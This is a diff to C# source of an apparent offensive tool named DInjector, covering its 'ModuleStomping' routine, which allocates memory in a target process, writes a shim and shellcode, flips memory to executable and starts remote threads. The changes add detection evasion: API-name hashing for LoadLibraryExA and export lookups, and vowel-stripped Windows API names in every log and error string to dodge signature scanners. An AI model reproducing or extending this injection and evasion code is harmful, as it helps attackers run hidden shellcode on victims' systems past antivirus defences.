@@ -49,7 +49,8 @@ namespace DInjector
             #region GenerateShim
 
             var kernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
-            var loadLibraryEx = DI.DynamicInvoke.Generic.GetExportAddress(kernel32, "LoadLibraryExA");
+            // { API_HASHING:LoadLibraryExA }
+            var loadLibraryEx = DI.DynamicInvoke.Generic.GetExportAddress(kernel32, "c106e6bed4fb14d50b1485713551941a", 0x220b3d05);
 
             var shim = GenerateShim((long)loadLibraryEx);
             var bModuleName = Encoding.ASCII.GetBytes(moduleName);
@@ -71,9 +72,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (bModuleNameLength), PAGE_READWRITE");
+                Console.WriteLine("(ModuleStomping) [+] NtAllctVrtlMmry (bModuleNameLength), PAGE_READWRITE");
             else
-                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (bModuleNameLength), PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtAllctVrtlMmry (bModuleNameLength), PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -91,9 +92,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (shimLength), PAGE_READWRITE");
+                Console.WriteLine("(ModuleStomping) [+] NtAllctVrtlMmry (shimLength), PAGE_READWRITE");
             else
-                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (shimLength), PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtAllctVrtlMmry (shimLength), PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -112,9 +113,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (bModuleName)");
+                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (bModuleName)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (bModuleName): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (bModuleName): {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
@@ -135,9 +136,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (shim)");
+                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (shim)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (shim): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (shim): {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
@@ -157,9 +158,9 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ");
+                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shim), PAGE_EXECUTE_READ");
             else
-                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shim), PAGE_EXECUTE_READ: {ntstatus}");
 
             #endregion
 
@@ -181,9 +182,9 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtCreateThreadEx (shim)");
+                Console.WriteLine("(ModuleStomping) [+] NtCrtThrdEx (shim)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtCreateThreadEx (shim): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtCrtThrdEx (shim): {ntstatus}");
 
             #endregion
 
@@ -197,11 +198,11 @@ namespace DInjector
                 ref liInf);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtWaitForSingleObject|STATUS_SUCCESS, timeout");
+                Console.WriteLine("(ModuleStomping) [+] NtWtFrSnglObjct|STATUS_SUCCESS, timeout");
             else if (ntstatus == NTSTATUS.Timeout)
-                Console.WriteLine("(ModuleStomping) [+] NtWaitForSingleObject|STATUS_TIMEOUT, timeout");
+                Console.WriteLine("(ModuleStomping) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, timeout");
             else
-                throw new Exception($"(ModuleStomping) [-] NtWaitForSingleObject, inf: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtWtFrSnglObjct, inf: {ntstatus}");
 
             #endregion
 
@@ -216,9 +217,9 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_RELEASE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtFreeVirtualMemory (allocModule)");
+                Console.WriteLine("(ModuleStomping) [+] NtFrVrtlMmry (allocModule)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtFreeVirtualMemory (allocModule): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtFrVrtlMmry (allocModule): {ntstatus}");
 
             #endregion
 
@@ -233,9 +234,9 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_RELEASE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtFreeVirtualMemory (allocShim)");
+                Console.WriteLine("(ModuleStomping) [+] NtFrVrtlMmry (allocShim)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtFreeVirtualMemory (allocShim): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtFrVrtlMmry (allocShim): {ntstatus}");
 
             #endregion
 
@@ -244,7 +245,7 @@ namespace DInjector
             #region Find targetAddress
 
             var hModule = DI.DynamicInvoke.Generic.LoadModuleFromDisk(moduleName);
-            var export = DI.DynamicInvoke.Generic.GetExportAddress(hModule, exportName);
+            var export = DI.DynamicInvoke.Generic.GetExportAddress(hModule, DI.DynamicInvoke.Generic.GetAPIHash(exportName, 0x31337), 0x31337);
             var offset = (long)export - (long)hModule;
 
             var targetAddress = IntPtr.Zero;
@@ -274,9 +275,9 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_READWRITE");
+                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shellcode), PAGE_READWRITE");
             else
-                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shellcode), PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -295,9 +296,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (shellcode)");
+                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (shellcode)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (shellcode): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (shellcode): {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
@@ -316,9 +317,9 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ");
+                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shellcode), PAGE_EXECUTE_READ");
             else
-                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shellcode), PAGE_EXECUTE_READ: {ntstatus}");
 
             #endregion
 
@@ -340,9 +341,9 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtCreateThreadEx (shellcode)");
+                Console.WriteLine("(ModuleStomping) [+] NtCrtThrdEx (shellcode)");
             else
-                throw new Exception($"(ModuleStomping) [-] NtCreateThreadEx (shellcode): {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtCrtThrdEx (shellcode): {ntstatus}");
 
             #endregion
 
